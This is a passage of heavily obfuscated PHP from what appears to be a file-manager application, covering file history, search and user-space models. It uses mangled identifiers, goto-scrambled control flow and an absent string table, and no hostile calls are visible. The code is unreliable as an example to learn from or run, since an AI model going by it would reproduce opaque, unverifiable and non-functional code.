$a»˜‚¬Æ¥‰ = array_slice($a»˜‚¬Æ¥‰, $AÕ¯Œ‡ã¨”); goto dƒÜÖ£öŞå; dƒÜÖ£öŞå: $aä£Ÿ‡¤Óà = array_to_keyvalue($Eêëø¶’‡“, $FÎí´†ïå©[33], $FÎí´†ïå©[419]); $aä£Ÿ‡¤Óà = array_slice($aä£Ÿ‡¤Óà, $AÕ¯Œ‡ã¨”); if (!$a»˜‚¬Æ¥‰ || !$aä£Ÿ‡¤Óà) { return; } goto d·ß¶ªğô°; AÒ‚‘§‘: $FÎí´†ïå© =& $_SERVER[‚Ğ°–—î]; $bªÙ¿¬‚ƒø = Model($FÎí´†ïå©[1089])->get($FÎí´†ïå©[2305]); $A†ğ‹Œ§³ = $GLOBALS[$FÎí´†ïå©[6]][$FÎí´†ïå©[84]][$FÎí´†ïå©[2303]]; goto cøÚ­éîØÖ; fœ×Î¥‡¹„: if ($AÕ¯Œ‡ã¨” >= 500) { return; } $F¡’“‹–² = array($FÎí´†ïå©[383] => $EÖÍ“¶İï¢); $Eêëø¶’‡“ = $this->field($FÎí´†ïå©[2307])->where($F¡’“‹–²)->order($FÎí´†ïå©[2299])->select(); goto BÂ§¢¬ªİŞ; cøÚ­éîØÖ: $eùÙ¬‘ïß = $bªÙ¿¬‚ƒø == $FÎí´†ïå©[2306] ? 3 : $A†ğ‹Œ§³; if ($A†ğ‹Œ§³ <= 1) { $eùÙ¬‘ïß = 1; } $AÕ¯Œ‡ã¨” = $eùÙ¬‘ïß - 1; goto fœ×Î¥‡¹„; AÂíÏ¸óÒ: } public function listData($C¸•ÆÑáï©) { goto CÙé‘©ŞÊ; Eª¬Ã½è— : $FÁ–ÈŠºØ = $this->field($b”ï®Öù Ô)->where($e¦À”Üòƒ)->order($cÌÛÛÈÀ’˜[2299])->selectPage(); $this->_listAppendUser($FÁ–ÈŠºØ[$cÌÛÛÈÀ’˜[354]]); $b”½ Æª½ = Model($cÌÛÛÈÀ’˜[1089])->get($cÌÛÛÈÀ’˜[2305]); goto C¡ö•ÇÃß; C¡ö•ÇÃß: $aÓäİ‰å‹‹ = 3; if ($b”½ Æª½ == $cÌÛÛÈÀ’˜[2306]) { $FÁ–ÈŠºØ[$cÌÛÛÈÀ’˜[354]] = array_slice($FÁ–ÈŠºØ[$cÌÛÛÈÀ’˜[354]], 0, $aÓäİ‰å‹‹); $FÁ–ÈŠºØ[$cÌÛÛÈÀ’˜[351]] = array($cÌÛÛÈÀ’˜[2309] => 1, $cÌÛÛÈÀ’˜[2310] => 20, $cÌÛÛÈÀ’˜[2311] => 1, $cÌÛÛÈÀ’˜[2312] => count($FÁ–ÈŠºØ[$cÌÛÛÈÀ’˜[354]])); } return $FÁ–ÈŠºØ; goto C•ö›ÕÓ…; CÙé‘©ŞÊ: $cÌÛÛÈÀ’˜ =& $_SERVER[‚Ğ°–—î]; $e¦À”Üòƒ = array($cÌÛÛÈÀ’˜[383] => $C¸•ÆÑáï©); $b”ï®Öù Ô = $cÌÛÛÈÀ’˜[2308]; goto Eª¬Ã½è— ; C•ö›ÕÓ…: } protected function _listAppendUser(&$dø…§¤åÒ) { $cå ¹†Œ =& $_SERVER[‚Ğ°–—î]; $FãØ„–À“ª = array_to_keyvalue($dø…§¤åÒ, $cå ¹†Œ[33], $cå ¹†Œ[1438]); $CÄ¸Ê•ŠÕ = Model($cå ¹†Œ[477])->userListInfo($FãØ„–À“ª); foreach ($dø…§¤åÒ as &$A†ñÎöŞŒº) { $D¡¢†õî­¡ = $A†ñÎöŞŒº[$cå ¹†Œ[1438]]; $A†ñÎöŞŒº[$cå ¹†Œ[378]] = $CÄ¸Ê•ŠÕ[$D¡¢†õî­¡] ? $CÄ¸Ê•ŠÕ[$D¡¢†õî­¡] : !1; } } public function fileInfo($A¢°ìğœƒ) { $BŸ¯åÉÕ¤Ë =& $_SERVER[‚Ğ°–—î]; $FÁ™ØïÆ¿… = $this->tablePrefix; $FªÆÑãÓ¼Æ = "{$FÁ™ØïÆ¿…}\151\157\137\146\x69\x6c\x65\x20\x66\151\x6c\x65\x73\x20\157\x6e\40\x66\x69\x6c\145\x73\56\x66\x69\x6c\145\x49\x44\x20\75\x20\150\151\x73\164\157\162\x79\56\146\151\x6c\x65\111\104"; return $this->alias($BŸ¯åÉÕ¤Ë[2313])->where(array($BŸ¯åÉÕ¤Ë[385] => $A¢°ìğœƒ))->join($FªÆÑãÓ¼Æ, $BŸ¯åÉÕ¤Ë[2314])->find(); } public function removeItem($B¹ÛÏöåï‰) { $bŠ Şùß³é =& $_SERVER[‚Ğ°–—î]; $aº‰‹×ä¶ƒ = array($bŠ Şùß³é[385] => $B¹ÛÏöåï‰); $b›ò‚åæ± = $this->where($aº‰‹×ä¶ƒ)->find(); if ($b›ò‚åæ±) { $b®†‹§µŞİ = $this->where($aº‰‹×ä¶ƒ)->delete(); Model($bŠ Şùß³é[422])->remove($b›ò‚åæ±[$bŠ Şùß³é[419]]); return $b®†‹§µŞİ; } return !1; } public function removeBySource($B´É‰Ñ¬Ë§) { goto c‹“Ñãˆ°é; CÂ »¹Š›¶: $aäÜŒô¤Ñ = array($C¡ÙˆÄù³[383] => array($C¡ÙˆÄù³[7], $B´É‰Ñ¬Ë§)); $E²¬¹Ëœªù = $this->field($C¡ÙˆÄù³[420])->where($aäÜŒô¤Ñ)->select(); if ($E²¬¹Ëœªù) { $this->where($aäÜŒô¤Ñ)->delete(); $DÚŸÈ‰Š„ = array_to_keyvalue($E²¬¹Ëœªù, $C¡ÙˆÄù³[33], $C¡ÙˆÄù³[419]); Model($C¡ÙˆÄù³[422])->remove($DÚŸÈ‰Š„); } goto D›ÔºÓŞÆ; c‹“Ñãˆ°é: $C¡ÙˆÄù³ =& $_SERVER[‚Ğ°–—î]; if (!$B´É‰Ñ¬Ë§) { return !1; } if (!is_array($B´É‰Ñ¬Ë§)) { $B´É‰Ñ¬Ë§ = array($B´É‰Ñ¬Ë§); } goto CÂ »¹Š›¶; D›ÔºÓŞÆ: return !0; goto D¬ë‘„¤¢Ñ; D¬ë‘„¤¢Ñ: } public function setDetail($BÈë–ƒÔ„¥, $B¤›®öÂØé) { $AÎ×¥†¨ã =& $_SERVER[‚Ğ°–—î]; return $this->where(array($AÎ×¥†¨ã[385] => $BÈë–ƒÔ„¥))->save(array($AÎ×¥†¨ã[2302] => $B¤›®öÂØé)); } public function rollbackToItem($fß§­ìäø, $b›Ìˆ‹šàÏ) { goto f½™ËÂò‹ƒ; fí²ø²æ‹¶: return $this->where(array($E‚Í©¾Ø‡[385] => $b›Ìˆ‹šàÏ))->delete(); goto cÖâÛºˆö©; f½™ËÂò‹ƒ: $E‚Í©¾Ø‡ =& $_SERVER[‚Ğ°–—î]; $AêÆ¸äÌ‰ = Model($E‚Í©¾Ø‡[752])->sourceInfo($fß§­ìäø); $this->addHistory($AêÆ¸äÌ‰); goto EŠ­Šåù—; EŠ­Šåù—: $D Ÿ¾´¬¢ô = $this->find($b›Ìˆ‹šàÏ); $A‹ó½Ö•”” = array($E‚Í©¾Ø‡[419] => $D Ÿ¾´¬¢ô[$E‚Í©¾Ø‡[419]], $E‚Í©¾Ø‡[77] => $D Ÿ¾´¬¢ô[$E‚Í©¾Ø‡[77]], $E‚Í©¾Ø‡[107] => time(), $E‚Í©¾Ø‡[379] => USER_ID); Model($E‚Í©¾Ø‡[752])->where(array($E‚Í©¾Ø‡[369] => $fß§­ìäø))->save($A‹ó½Ö•””); goto fí²ø²æ‹¶; cÖâÛºˆö©: } public function clearSame($fØæŞ¿»Š) { goto CàğöÛ¿’; EÂˆ•Â·Ô¿: $c¥Â»Õ—Ö = array(); $cÊ‰ ®—î‘ = array(); foreach ($cŒ¢ïåöÌ as $C•î¡²Íõ±) { if (!$C•î¡²Íõ± || count($C•î¡²Íõ±) <= 1) { continue; } foreach ($C•î¡²Íõ± as $fùæÏ—©œÀ) { $c¥Â»Õ—Ö[] = $fùæÏ—©œÀ[$bÕ­ô‰¡¿[419]]; $cÊ‰ ®—î‘[] = $fùæÏ—©œÀ[$bÕ­ô‰¡¿[367]]; } } goto Dß†î·•—²; CàğöÛ¿’: $bÕ­ô‰¡¿ =& $_SERVER[‚Ğ°–—î]; $d˜ˆØò‹½ = $this->listData($fØæŞ¿»Š); $cŒ¢ïåöÌ = array_to_keyvalue_group($d˜ˆØò‹½, $bÕ­ô‰¡¿[419]); goto EÂˆ•Â·Ô¿; Dß†î·•—²: if (!$cÊ‰ ®—î‘) { return; } $this->where(array($bÕ­ô‰¡¿[367] => array($bÕ­ô‰¡¿[7], $cÊ‰ ®—î‘)))->delete(); Model($bÕ­ô‰¡¿[422])->remove($c¥Â»Õ—Ö); goto eøé„®ŒÆå; eøé„®ŒÆå: } public function userSpace() { $FòËØ„©ˆó =& $_SERVER[‚Ğ°–—î]; $Dãù¸í  = $this->tablePrefix; $aö°›¸—Ã = array($FòËØ„©ˆó[1429] => USER_ID); $c°°³«×šì = "{$Dãù¸í }\151\x6f\x5f\x66\151\x6c\x65\x20\146\x69\x6c\145\x73\40\x6f\156\40\x66\x69\154\x65\163\56\146\151\x6c\x65\x49\104\x20\75\40\x68\151\x73\164\x6f\x72\171\56\x66\x69\x6c\145\111\104"; return $this->alias($FòËØ„©ˆó[2313])->where($aö°›¸—Ã)->join($c°°³«×šì, $FòËØ„©ˆó[2314])->sum($FòËØ„©ˆó[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DŒÁğšï´) { goto fØÛŸÛË‘Ô; cùÎÒö›µá: if (!$aÍîŒƒ ¨Š) { return array(); } $A•¥…¬éù = $aÍîŒƒ ¨Š[$fõĞ¡‚ÒŒÂ[160]]; $D‚Ù‹™¬İŒ = $fõĞ¡‚ÒŒÂ[7]; goto dâò¶†…œ; fØÛŸÛË‘Ô: $fõĞ¡‚ÒŒÂ =& $_SERVER[‚Ğ°–—î]; $E¦Ùï…å±œ = KodIO::fileTypeList(); $aÍîŒƒ ¨Š = $E¦Ùï…å±œ[$DŒÁğšï´]; goto cùÎÒö›µá; dâò¶†…œ: if (!$aÍîŒƒ ¨Š[$fõĞ¡‚ÒŒÂ[160]]) { $EÛùö°‘ğ˜ = array_to_keyvalue($E¦Ùï…å±œ, $fõĞ¡‚ÒŒÂ[33], $fõĞ¡‚ÒŒÂ[160]); $A•¥…¬éù = implode($fõĞ¡‚ÒŒÂ[47], $EÛùö°‘ğ˜); $D‚Ù‹™¬İŒ = $fõĞ¡‚ÒŒÂ[2265]; } $B‘—Œ”ŸÛ‚ = explode($fõĞ¡‚ÒŒÂ[47], trim($A•¥…¬éù, $fõĞ¡‚ÒŒÂ[47])); return array($D‚Ù‹™¬İŒ, $B‘—Œ”ŸÛ‚); goto dŒäÕƒìç; dŒäÕƒìç: } public function listPathType($CÌå¢œ¹å) { $aã±÷­“Ê =& $_SERVER[‚Ğ°–—î]; $f„’´áŠ‚‘ = $this->fileTypeWhere($CÌå¢œ¹å); if (!$f„’´áŠ‚‘) { return array(); } $eéàÕ¶‹¡â = array($aã±÷­“Ê[521] => SourceModel::TYPE_USER, $aã±÷­“Ê[522] => USER_ID, $aã±÷­“Ê[518] => 0, $aã±÷­“Ê[519] => $f„’´áŠ‚‘); return $this->listSource($eéàÕ¶‹¡â); } public function listSearch($Câ¾¨¼ì, $aØ¤“ôÎ²‘ = 300) { goto f¨ó÷Åã£; Aé¿­£¸Ÿ™: $this->_listSearchBindPinyin($Câ¾¨¼ì, $b‚é‰©áŸ„, $Dë©ª¬Ï»î); $this->alias($f‹®Œğå«[487])->_makeOrder()->cache(null, 10); $eÇŞ‚ø¥†Ÿ = $this->distinct(!0)->field($Dë©ª¬Ï»î)->where($b‚é‰©áŸ„)->selectPage($aØ¤“ôÎ²‘); goto fÁË†õºµ·; B±ãŠ…·: if (!isset($b‚é‰©áŸ„[$f‹®Œğå«[397]])) { $b‚é‰©áŸ„[$f‹®Œğå«[397]] = 0; } $Dë©ª¬Ï»î = $f‹®Œğå«[2316]; $F»’ŒõÏÏ = $Dë©ª¬Ï»î; goto Aé¿­£¸Ÿ™; C‡ê‚ÆêÁß: $this->_listMake($eÇŞ‚ø¥†Ÿ); return $eÇŞ‚ø¥†Ÿ; goto c¨ÊƒˆîÄ; f¨ó÷Åã£: $f‹®Œğå« =& $_SERVER[‚Ğ°–—î]; if (isset($Câ¾¨¼ì[$f‹®Œğå«[2183]]) && $Câ¾¨¼ì[$f‹®Œğå«[2183]]) { $Câ¾¨¼ì[$f‹®Œğå«[2183]] = str_replace($f‹®Œğå«[1594], $f‹®Œğå«[2315], trim($Câ¾¨¼ì[$f‹®Œğå«[2183]])); } $b‚é‰©áŸ„ = $this->_parseSearchWhere($Câ¾¨¼ì); goto B±ãŠ…·; fÁË†õºµ·: $this->_listSearchDesc($eÇŞ‚ø¥†Ÿ, $Câ¾¨¼ì, $F»’ŒõÏÏ); $this->_listSearchTag($eÇŞ‚ø¥†Ÿ, $Câ¾¨¼ì, $F»’ŒõÏÏ); $this->_listDataApply($eÇŞ‚ø¥†Ÿ[$f‹®Œğå«[354]]); goto C‡ê‚ÆêÁß; c¨ÊƒˆîÄ: } private function _listSearchTag(&$D±ÇÕ…ó‹ª, $f±È‡ÆÔä, $fæÀíö ) { goto bÑìº±Ï‰; dõ¸Üêâ™ƒ: $dŞ Ú†ğ…¥ = array_to_keyvalue($dŞ Ú†ğ…¥, $b‚¨£ïè¤[33], $b‚¨£ïè¤[75]); $E”ˆ±ß¦ = array_unique($dŞ Ú†ğ…¥); $this->_listSearchMerge($D±ÇÕ…ó‹ª, $f±È‡ÆÔä, $fæÀíö , $E”ˆ±ß¦); goto a‹à®Ñ’ƒ; b«ù›èªéŒ: if (!$AòÏ¦ˆ…Ñ) { return; } $E·¶¸¤—Ğ´ = array($b‚¨£ïè¤[393] => array($b‚¨£ïè¤[7], $AòÏ¦ˆ…Ñ)); $dŞ Ú†ğ…¥ = Model($b‚¨£ïè¤[394])->field($b‚¨£ïè¤[75])->where($E·¶¸¤—Ğ´)->select(); goto dõ¸Üêâ™ƒ; bÑìº±Ï‰: $b‚¨£ïè¤ =& $_SERVER[‚Ğ°–—î]; if (!$f±È‡ÆÔä[$b‚¨£ïè¤[2183]] || $D±ÇÕ…ó‹ª[$b‚¨£ïè¤[351]][$b‚¨£ïè¤[340]] > 1) { return; } $Fˆî¹“ƒ¸£ = Model($b‚¨£ïè¤[2317])->listData(); goto DàŒæË‚˜; DàŒæË‚˜: $AòÏ¦ˆ…Ñ = array(); $EÍÕá‰ÖøÆ = $f±È‡ÆÔä[$b‚¨£ïè¤[2183]]; foreach ($Fˆî¹“ƒ¸£ as $Fë”ËÖôí) { $CÙ·åÁÉ¿Ö = $Fë”ËÖôí[$b‚¨£ïè¤[28]]; $DÇ´ ø“¶› = str_replace($b‚¨£ïè¤[50], $b‚¨£ïè¤[33], Pinyin::encode($CÙ·åÁÉ¿Ö)); if (stripos($CÙ·åÁÉ¿Ö, $EÍÕá‰ÖøÆ) !== !1 || stripos($DÇ´ ø“¶›, $EÍÕá‰ÖøÆ) !== !1) { $AòÏ¦ˆ…Ñ[] = $Fë”ËÖôí[$b‚¨£ïè¤[367]]; } } goto b«ù›èªéŒ; a‹à®Ñ’ƒ: } private function _listSearchDesc(&$DÌí¥£ï‡², $e½Ğëí’Ê£, $c‘¡°ØíƒÏ) { goto D”…À¦¯; D”…À¦¯: $cÇê—É×Ç =& $_SERVER[‚Ğ°–—î]; if (!$e½Ğëí’Ê£[$cÇê—É×Ç[2183]] || $DÌí¥£ï‡²[$cÇê—É×Ç[351]][$cÇê—É×Ç[340]] > 1) { return; } $aíìç›²¦ = $this->listSearchChildren($e½Ğëí’Ê£[$cÇê—É×Ç[461]]); goto d°æ«ìÅË; cÆñ¤ªïŠ¨: $DÈË±Äôë = Model($cÇê—É×Ç[504])->field($cÇê—É×Ç[369])->where($b§‹†ƒ÷Îà)->select(); $B¹•ğà¹·À = array_to_keyvalue($DÈË±Äôë, $cÇê—É×Ç[33], $cÇê—É×Ç[369]); $this->_listSearchMerge($DÌí¥£ï‡², $e½Ğëí’Ê£, $c‘¡°ØíƒÏ, $B¹•ğà¹·À); goto fÚİˆô±–; d°æ«ìÅË: $aíìç›²¦ = array_unique($aíìç›²¦); if (!$aíìç›²¦) { return; } $b§‹†ƒ÷Îà = array($cÇê—É×Ç[369] => array($cÇê—É×Ç[7], $aíìç›²¦), $cÇê—É×Ç[89] => $cÇê—É×Ç[405], $cÇê—É×Ç[359] => array($cÇê—É×Ç[751], $cÇê—É×Ç[2185] . $e½Ğëí’Ê£[$cÇê—É×Ç[2183]] . $cÇê—É×Ç[2185])); goto cÆñ¤ªïŠ¨; fÚİˆô±–: } private function _listSearchMerge(&$f•œ¯§Ğê, $C–•ÒæÅÏ§, $dÃ…ÓÜ’¼¶, $Bœ¬äœ”š) { goto E„™ºÚºôÒ; b­ÜÎÎèÜÆ: foreach ($cÂ¢îÏ“ˆ as $d‰®ö¸ğšÀ) { $dîã¶à³„ = $cÇİŞÜ¿Á[47] . $C–•ÒæÅÏ§[$cÇİŞÜ¿Á[461]] . $cÇİŞÜ¿Á[47]; if (stripos($d‰®ö¸ğšÀ[$cÇİŞÜ¿Á[459]], $dîã¶à³„) !== !1) { $Fà»Ú¿‘ºŞ[] = $d‰®ö¸ğšÀ; } } $f•œ¯§Ğê[$cÇİŞÜ¿Á[354]] = array_merge($Fà»Ú¿‘ºŞ, $f•œ¯§Ğê[$cÇİŞÜ¿Á[354]]); $f•œ¯§Ğê[$cÇİŞÜ¿Á[351]][$cÇİŞÜ¿Á[352]] += count($Fà»Ú¿‘ºŞ); goto cãÄ„öÀÙ; E„™ºÚºôÒ: $cÇİŞÜ¿Á =& $_SERVER[‚Ğ°–—î]; if (!$Bœ¬äœ”š) { return; } $C÷Ç¨½‡Èè = array_to_keyvalue($f•œ¯§Ğê[$cÇİŞÜ¿Á[354]], $cÇİŞÜ¿Á[33], $cÇİŞÜ¿Á[369]); goto BÒÌÌùŠÒˆ; bˆØ—Èà˜­: $cÂ¢îÏ“ˆ = $this->field($dÃ…ÓÜ’¼¶)->where($fµ÷©ùëêé)->select(); if (!$cÂ¢îÏ“ˆ) { return; } $Fà»Ú¿‘ºŞ = array(); goto b­ÜÎÎèÜÆ; BÒÌÌùŠÒˆ: $aÌ…‘áèÇš = array_diff($Bœ¬äœ”š, $C÷Ç¨½‡Èè); if (!$aÌ…‘áèÇš) { return; } $fµ÷©ùëêé = array($cÇİŞÜ¿Á[369] => array($cÇİŞÜ¿Á[7], $aÌ…‘áèÇš)); goto bˆØ—Èà˜­; cãÄ„öÀÙ: } public function listSearchChildren($Bà±¤‡Ÿ“, $fêÖ °ˆæÌ = 5000) { goto a¾¼ñˆåâ; fÕÉ»°ã‚: $dáŞÏçùÕˆ = array($aß´‹á¾ğ [459] => array($aß´‹á¾ğ [751], $B“øõùœà[$aß´‹á¾ğ [459]] . $B“øõùœà[$aß´‹á¾ğ [369]] . $aß´‹á¾ğ [484])); $A¯„ƒÆõÏÊ = $this->field($aß´‹á¾ğ [369])->cache(null, 600)->where($dáŞÏçùÕˆ)->count(); if ($A¯„ƒÆõÏÊ > $fêÖ °ˆæÌ) { return $this->_listSearchChildrenNear($Bà±¤‡Ÿ“, $fêÖ °ˆæÌ); } goto A¼¼ÖºÁ™Ô; A¼¼ÖºÁ™Ô: $dçìÁ³†õÈ = $this->field($aß´‹á¾ğ [369])->where($dáŞÏçùÕˆ)->select(); $Dç¨÷È²Î = array_to_keyvalue($dçìÁ³†õÈ, $aß´‹á¾ğ [33], $aß´‹á¾ğ [369]); return $Dç¨÷È²Î; goto dç…Œ„Šæ¥; a¾¼ñˆåâ: $aß´‹á¾ğ  =& $_SERVER[‚Ğ°–—î]; $Dç¨÷È²Î = array(); $B“øõùœà = $this->sourceInfo($Bà±¤‡Ÿ“); goto fÕÉ»°ã‚; dç…Œ„Šæ¥: } private function _listSearchChildrenNear($eĞÄÆÚª¤, $dšêŞ“ìŠ) { goto FÊÊ¾¥“Í; BäŒøˆß•Æ: $aŒÊ˜Ò´Óª = array_merge($aŒÊ˜Ò´Óª, array_to_keyvalue($aËËìà”©Ó, $fÃ«ŸÄµ‡ä[33], $fÃ«ŸÄµ‡ä[369])); $aŒÊ˜Ò´Óª = array_slice($aŒÊ˜Ò´Óª, 0, $dšêŞ“ìŠ); return $aŒÊ˜Ò´Óª; goto A¬•³“¿Ôà; FÊÊ¾¥“Í: $fÃ«ŸÄµ‡ä =& $_SERVER[‚Ğ°–—î]; $aŒÊ˜Ò´Óª = array(); $fî÷ªÁ•ÎÔ = array($fÃ«ŸÄµ‡ä[461] => $eĞÄÆÚª¤); goto e´ÆóÖÜ–; e´ÆóÖÜ–: $aËËìà”©Ó = $this->field($fÃ«ŸÄµ‡ä[2318])->where($fî÷ªÁ•ÎÔ)->select(); $EÏ¨¾¢ŠÃ° = array_to_keyvalue(array_filter_by_field($aËËìà”©Ó, $fÃ«ŸÄµ‡ä[370], $fÃ«ŸÄµ‡ä[83]), $fÃ«ŸÄµ‡ä[33], $fÃ«ŸÄµ‡ä[369]); $aŒÊ˜Ò´Óª = array_merge($aŒÊ˜Ò´Óª, array_to_keyvalue($aËËìà”©Ó, $fÃ«ŸÄµ‡ä[33], $fÃ«ŸÄµ‡ä[369])); goto bÍ¨ë§Ë¶Š; bÍ¨ë§Ë¶Š: if (!$EÏ¨¾¢ŠÃ°) { return $aŒÊ˜Ò´Óª; } $fî÷ªÁ•ÎÔ = array($fÃ«ŸÄµ‡ä[461] => array($fÃ«ŸÄµ‡ä[7], $EÏ¨¾¢ŠÃ°)); $aËËìà”©Ó = $this->field($fÃ«ŸÄµ‡ä[2318])->where($fî÷ªÁ•ÎÔ)->select(); goto BäŒøˆß•Æ; A¬•³“¿Ôà: } private function _listSearchBindPinyin($e³³ßµš†ˆ, &$C Ì‡ÁÂ²ñ, &$E–Ï‘µ£) { goto B½Üê¢Šñ; cÜÈô…ãŠ: $eù„É´¸ó¹ = array(); $E–Ï‘µ£ = str_replace(array($DŠŸ¤©àÔÊ[217], $DŠŸ¤©àÔÊ[50], $DŠŸ¤©àÔÊ[2319]), $DŠŸ¤©àÔÊ[33], $E–Ï‘µ£); $E–Ï‘µ£ = $DŠŸ¤©àÔÊ[2320] . str_replace($DŠŸ¤©àÔÊ[47], $DŠŸ¤©àÔÊ[2321], $E–Ï‘µ£); goto b½ÇÓß÷¬; B½Üê¢Šñ: $DŠŸ¤©àÔÊ =& $_SERVER[‚Ğ°–—î]; if (!Input::check($e³³ßµš†ˆ[$DŠŸ¤©àÔÊ[2183]], $DŠŸ¤©àÔÊ[306]) || strlen($e³³ßµš†ˆ[$DŠŸ¤©àÔÊ[2183]]) < 2) { return; } $dâÃÃÁîƒ° = "\x4c\x45\106\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\x69\157\x5f\x73\157\x75\x72\143\145\x5f\x6d\x65\x74\x61\40\155\x65\164\141\40\x6f\x6e\40\x73\157\x75\162\143\x65\x2e\x73\157\x75\162\143\145\x49\104\40\75\x20\x6d\145\x74\141\x2e\x73\157\x75\x72\143\x65\x49\104"; goto cÜÈô…ãŠ; f‘ŞòØ¼›è: $eù„É´¸ó¹[] = array($DŠŸ¤©àÔÊ[2322] => $CÛ–Ô«¯º­, $DŠŸ¤©àÔÊ[915] => $DŠŸ¤©àÔÊ[2187], array($DŠŸ¤©àÔÊ[2323] => $CÛ–Ô«¯º­, $DŠŸ¤©àÔÊ[2324] => array($DŠŸ¤©àÔÊ[7], array($DŠŸ¤©àÔÊ[416], $DŠŸ¤©àÔÊ[415])))); $this->join($dâÃÃÁîƒ°); $C Ì‡ÁÂ²ñ = $eù„É´¸ó¹; goto C‚¾×ãÉô„; b½ÇÓß÷¬: unset($C Ì‡ÁÂ²ñ[$DŠŸ¤©àÔÊ[28]]); foreach ($C Ì‡ÁÂ²ñ as $B£ƒò¸Õñï => $dî›ãŒÓ«ï) { $eù„É´¸ó¹[$DŠŸ¤©àÔÊ[2320] . $B£ƒò¸Õñï] = $dî›ãŒÓ«ï; } $CÛ–Ô«¯º­ = array($DŠŸ¤©àÔÊ[483], $DŠŸ¤©àÔÊ[2185] . $e³³ßµš†ˆ[$DŠŸ¤©àÔÊ[2183]] . $DŠŸ¤©àÔÊ[2185]); goto f‘ŞòØ¼›è; C‚¾×ãÉô„: } private function _parseSearchWhere($bİò¤‚¯¶›) { goto A—Ø…Ô¿†; Fˆ‹Š¢ÑÙ½: if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[702]])) { $D¼‹’˜´¶ê = array($E’È£ºŸå½[2326], $bİò¤‚¯¶›[$E’È£ºŸå½[702]]); if ($eËóÌÏÒÈâ[$E’È£ºŸå½[107]]) { $eËóÌÏÒÈâ[$E’È£ºŸå½[107]] = array($eËóÌÏÒÈâ[$E’È£ºŸå½[107]], $D¼‹’˜´¶ê, $E’È£ºŸå½[2327]); } else { $eËóÌÏÒÈâ[$E’È£ºŸå½[107]] = $D¼‹’˜´¶ê; } } if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[2328]])) { $eËóÌÏÒÈâ[$E’È£ºŸå½[77]] = array($E’È£ºŸå½[2325], $bİò¤‚¯¶›[$E’È£ºŸå½[2328]]); } if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[2329]])) { $D¼‹’˜´¶ê = array($E’È£ºŸå½[2326], $bİò¤‚¯¶›[$E’È£ºŸå½[2329]]); if ($eËóÌÏÒÈâ[$E’È£ºŸå½[77]]) { $eËóÌÏÒÈâ[$E’È£ºŸå½[77]] = array($eËóÌÏÒÈâ[$E’È£ºŸå½[77]], $D¼‹’˜´¶ê, $E’È£ºŸå½[2327]); } else { $eËóÌÏÒÈâ[$E’È£ºŸå½[77]] = $D¼‹’˜´¶ê; } } goto Eæš„‰”¸‘; Eæš„‰”¸‘: if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[535]])) { $eËóÌÏÒÈâ[] = array($E’È£ºŸå½[379] => $bİò¤‚¯¶›[$E’È£ºŸå½[535]], $E’È£ºŸå½[378] => $bİò¤‚¯¶›[$E’È£ºŸå½[535]], $E’È£ºŸå½[915] => $E’È£ºŸå½[2187]); } if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[372]])) { $F¢±ˆšŒ•ß = $bİò¤‚¯¶›[$E’È£ºŸå½[372]]; if ($F¢±ˆšŒ•ß == $E’È£ºŸå½[76]) { $eËóÌÏÒÈâ[$E’È£ºŸå½[370]] = 1; } else { if ($F¢±ˆšŒ•ß == $E’È£ºŸå½[2330]) { $eËóÌÏÒÈâ[$E’È£ºŸå½[370]] = 0; } else { if ($F¢±ˆšŒ•ß) { $F¢±ˆšŒ•ß = is_array($F¢±ˆšŒ•ß) ? $F¢±ˆšŒ•ß : explode($E’È£ºŸå½[47], $F¢±ˆšŒ•ß); $eËóÌÏÒÈâ[$E’È£ºŸå½[372]] = array($E’È£ºŸå½[384], $F¢±ˆšŒ•ß); $eËóÌÏÒÈâ[$E’È£ºŸå½[370]] = 0; } } } } if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[461]])) { $fêÀ°…‘òÂ = $this->sourceInfo($bİò¤‚¯¶›[$E’È£ºŸå½[461]]); $eËóÌÏÒÈâ[$E’È£ºŸå½[525]] = array($E’È£ºŸå½[483], $fêÀ°…‘òÂ[$E’È£ºŸå½[459]] . $bİò¤‚¯¶›[$E’È£ºŸå½[461]] . $E’È£ºŸå½[484]); } goto CÇÉÌŞ’; CÇÉÌŞ’: if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[2183]]) && $bİò¤‚¯¶›[$E’È£ºŸå½[2183]]) { $AÃÛ½Øã = $bİò¤‚¯¶›[$E’È£ºŸå½[2183]]; $F¨”˜°ÁºÇ = explode($E’È£ºŸå½[50], $AÃÛ½Øã); if (strlen($AÃÛ½Øã) > 2 && (substr($AÃÛ½Øã, 0, 1) == $E’È£ºŸå½[113] && substr($AÃÛ½Øã, -1) == $E’È£ºŸå½[113]) || substr($AÃÛ½Øã, 0, 1) == $E’È£ºŸå½[55] && substr($AÃÛ½Øã, -1) == $E’È£ºŸå½[55]) { $AÃÛ½Øã = substr($AÃÛ½Øã, 1, -1); $F¨”˜°ÁºÇ = array($AÃÛ½Øã); } $eËóÌÏÒÈâ[$E’È£ºŸå½[28]] = array($E’È£ºŸå½[483], $E’È£ºŸå½[2185] . $AÃÛ½Øã . $E’È£ºŸå½[2185]); if (count($F¨”˜°ÁºÇ) > 1) { $eËóÌÏÒÈâ[$E’È£ºŸå½[28]] = array(); foreach ($F¨”˜°ÁºÇ as $dÆĞŞ ”³) { if (!trim($dÆĞŞ ”³)) { continue; } $eËóÌÏÒÈâ[$E’È£ºŸå½[28]][] = array($E’È£ºŸå½[483], $E’È£ºŸå½[2185] . trim($dÆĞŞ ”³) . $E’È£ºŸå½[2185]); } } } return $eËóÌÏÒÈâ; goto aå²õ—›Œ¿; A—Ø…Ô¿†: $E’È£ºŸå½ =& $_SERVER[‚Ğ°–—î]; $eËóÌÏÒÈâ = array(); if (isset($bİò¤‚¯¶›[$E’È£ºŸå½[701]])) { $eËóÌÏÒÈâ[$E’È£ºŸå½[107]] = array($E’È£ºŸå½[2325], $bİò¤‚¯¶›[$E’È£ºŸå½[701]]); } goto Fˆ‹Š¢ÑÙ½; aå²õ—›Œ¿: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E°Á†Š›Ç¬) { $B“ƒ Å­¤ =& $_SERVER[‚Ğ°–—î]; $A£Êôæµ±” = Model($B“ƒ Å­¤[474])->where(array($B“ƒ Å­¤[1429] => 